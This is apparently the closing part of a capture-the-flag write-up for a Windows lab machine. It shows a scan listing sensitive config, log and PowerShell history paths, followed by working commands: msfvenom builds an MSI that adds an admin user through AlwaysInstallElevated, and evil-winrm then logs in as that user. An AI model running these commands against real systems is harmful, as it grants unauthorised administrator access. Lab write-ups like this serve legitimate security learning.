C:\Users\Phoebe\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalState\dtlskey.der
C:\Users\Phoebe\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
C:\Windows\WinSxS\amd64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.19041.844_none_8782d7adcedfa6c3\appcmd.exe
C:\Windows\WinSxS\amd64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.19041.844_none_8782d7adcedfa6c3\f\appcmd.exe
C:\Windows\WinSxS\amd64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.19041.844_none_8782d7adcedfa6c3\r\appcmd.exe
C:\Windows\WinSxS\wow64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.19041.264_none_91c1d6c40350b1b6\appcmd.exe
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\conf\original\httpd.conf
C:\xampp\apache\conf\original\httpd.conf
C:\xampp\apache\conf\ssl.csr\server.csr
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\htdocs\omrs\admin\config_save.php
C:\xampp\htdocs\omrs\admin\includes\config_modal.php
C:\xampp\htdocs\omrs\tcpdf\tcpdf_autoconfig.php
C:\xampp\htdocs\omrs\tcpdf\config\tcpdf_config.php
C:\xampp\mysql\backup\my.ini
C:\xampp\mysql\bin\my.ini
C:\xampp\mysql\data\my.ini
C:\xampp\php\php.ini
C:\xampp\php\pear\PEAR\Config.php
C:\xampp\php\pear\PEAR\Command\Config.php
C:\xampp\php\pear\PHP\Debug\Renderer\HTML\DivConfig.php
C:\xampp\php\pear\PHP\Debug\Renderer\HTML\TableConfig.php
C:\xampp\php\pear\PHPUnit\Util\Configuration.php
C:\xampp\php\scripts\configure.php

---
Scan complete.





Install as elevated is possibles so usse msfvenom to create an exploit

msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi

Use curl to get this onto the machine

Run the alwe.msi which creates a user 
rottenadmin
P@ssword123!

use evil-winrm to access the machine
evil-winrm -i 10.10.10.239 -u rottenadmin -p P@ssword123!

Access key 
Rooted!!!!

